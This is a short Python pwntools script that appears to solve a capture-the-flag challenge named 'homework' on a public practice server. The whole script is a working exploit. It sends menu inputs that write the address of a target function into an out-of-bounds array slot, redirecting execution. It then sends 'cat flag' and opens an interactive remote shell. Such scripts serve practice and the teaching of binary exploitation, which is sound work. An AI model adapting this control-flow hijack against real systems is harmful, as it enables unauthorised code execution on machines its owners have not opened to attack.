from pwn import *

CALL_ME = 0x80485fb

payload = ''
payload += 'a\n'
payload += '1\n'
payload += '14\n'
payload += str(CALL_ME) + '\n'
payload += '0\n'
payload += 'cat flag'

#sh = process('./homework')
sh = remote('hackme.inndy.tw', 7701)
print sh.recv()
print sh.sendline(payload)
sh.interactive()
sh.close()
